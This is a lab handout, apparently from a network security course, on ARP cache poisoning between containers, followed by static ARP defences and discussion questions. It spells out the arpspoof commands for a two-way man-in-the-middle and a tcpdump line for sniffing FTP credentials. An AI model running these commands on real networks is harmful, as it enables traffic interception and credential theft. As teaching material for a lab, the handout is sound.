# Lab 01 – ARP poisoning and man‑in‑the‑middle

## Objectives

- Understand the Address Resolution Protocol (ARP) and its role in mapping IP addresses to MAC addresses.
- Perform ARP cache poisoning to position yourself as a man‑in‑the‑middle between two hosts.
- Capture and modify traffic passing through your machine.
- Implement defences against ARP poisoning.

## Background

When a host wants to send an IP packet to another host on the same LAN, it needs the destination’s MAC address.  ARP is a simple protocol that broadcasts a request (“Who has IP X?”) and receives a reply (“MAC Y at IP X”).  Hosts cache these mappings in an ARP table.  The protocol is unauthenticated; any host can send unsolicited ARP replies, and victims will update their cache:contentReference[oaicite:2]{index=2}.  Attackers exploit this to poison ARP caches and intercept traffic:contentReference[oaicite:3]{index=3}.

## Tasks

1. **Inspect ARP tables**  
   - From the `client` container, run `ip neigh` to view the ARP table.  
   - Ping the router (`192.168.10.1`) if the entry is missing; run `ip neigh` again and note the MAC address.

2. **Perform ARP poisoning**  
   - In the `attacker` container, install `arpspoof` (`apt install -y dsniff`).  
   - Enable IP forwarding (`sysctl -w net.ipv4.ip_forward=1`).  
   - Run `arpspoof -i eth0 -t 192.168.10.3 192.168.10.1` in one terminal and `arpspoof -i eth0 -t 192.168.10.1 192.168.10.3` in another.  
   - Observe the ARP table on the client and router; your MAC address should now be associated with both IP addresses.

3. **Capture traffic**  
   - Use `tcpdump -i eth0 port 21` to capture FTP credentials when the client connects to `192.168.30.11`.  
   - Try modifying HTTP responses using a proxy or a simple Python script.

4. **Defend against ARP poisoning**  
   - Discuss how static ARP entries or dynamic ARP inspection can prevent poisoning.  
   - In a small network, add static ARP entries on the client and router (`ip neigh add 192.168.10.1 lladdr <router1-mac> dev eth0`).  
   - Test that ARP spoofing no longer works.

5. **Discussion**  
   - Why is ARP poisoning effective only within a broadcast domain?  
   - How can switches mitigate ARP spoofing?  
   - What are the limitations of static ARP entries?

Proceed to [Lab 02 – IP fragmentation & ICMP attacks](02-ip-icmp-attacks.md).
